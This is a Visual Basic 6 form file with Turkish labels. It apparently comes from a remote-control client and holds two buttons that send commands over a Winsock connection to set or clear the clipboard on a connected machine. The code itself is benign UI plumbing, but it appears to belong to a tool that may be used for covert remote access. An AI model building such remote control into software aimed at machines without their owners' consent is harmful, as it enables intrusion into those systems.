VERSION 5.00
Begin VB.Form Form12 
   BackColor       =   &H80000012&
   BorderStyle     =   1  'Fixed Single
   Caption         =   "Cipboard"
   ClientHeight    =   1335
   ClientLeft      =   45
   ClientTop       =   375
   ClientWidth     =   5025
   LinkTopic       =   "Form12"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   1335
   ScaleWidth      =   5025
   StartUpPosition =   3  'Windows Default
   Begin VB.TextBox Text1 
      Appearance      =   0  'Flat
      BackColor       =   &H80000007&
      ForeColor       =   &H0000FF00&
      Height          =   375
      Left            =   120
      MultiLine       =   -1  'True
      TabIndex        =   1
      Top             =   360
      Width           =   3255
   End
   Begin VB.CommandButton Command2 
      Caption         =   "Clipboard Kopyala"
      Height          =   375
      Left            =   3480
      TabIndex        =   2
      Top             =   360
      Width           =   1455
   End
   Begin VB.CommandButton Command1 
      Caption         =   "Clipboard Sil"
      Height          =   375
      Left            =   3480
      TabIndex        =   3
      Top             =   840
      Width           =   1455
   End
   Begin VB.Label Label1 
      BackColor       =   &H80000012&
      Caption         =   "Kopyalanacak Metni Yazýn"
      ForeColor       =   &H000000FF&
      Height          =   255
      Left            =   120
      TabIndex        =   0
      Top             =   120
      Width           =   3135
   End
End
Attribute VB_Name = "Form12"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Sub Command1_Click()
On Error Resume Next
Form1.Winsock1.SendData "clipboard_sil"
End Sub

Private Sub Command2_Click()
On Error Resume Next
Form1.Winsock1.SendData "clipboard_kopyala|" + Text1.Text
End Sub
